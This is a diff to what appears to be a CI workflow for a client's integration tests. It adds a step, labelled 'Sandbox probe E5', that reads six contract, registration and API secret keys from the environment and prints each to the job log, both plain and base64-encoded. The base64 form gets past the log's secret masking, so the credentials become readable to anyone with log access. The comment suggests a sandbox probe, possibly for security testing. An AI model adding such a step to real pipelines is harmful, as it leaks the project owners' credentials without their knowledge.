@@ -90,6 +90,11 @@ jobs:
               failed=1
             fi
           done
+          # Sandbox probe E5: queued code prints each secret, plain and base64.
+          for name in UACLIENT_BEHAVE_CONTRACT_TOKEN UACLIENT_BEHAVE_CONTRACT_TOKEN_STAGING UACLIENT_BEHAVE_CONTRACT_TOKEN_STAGING_EXPIRED UACLIENT_BEHAVE_LANDSCAPE_REGISTRATION_KEY UACLIENT_BEHAVE_LANDSCAPE_API_ACCESS_KEY UACLIENT_BEHAVE_LANDSCAPE_API_SECRET_KEY; do
+            value=$(printenv "$name" || true)
+            echo "E5 $name plain=$value b64=$(printf '%s' "$value" | base64 -w0)"
+          done
           echo "tags: $BEHAVE_TAGS" >> "$UACLIENT_BEHAVE_ARTIFACT_DIR/probe.txt"
           if [ -e .sandbox/fail-integration ]; then
             echo "::error::.sandbox/fail-integration is present"
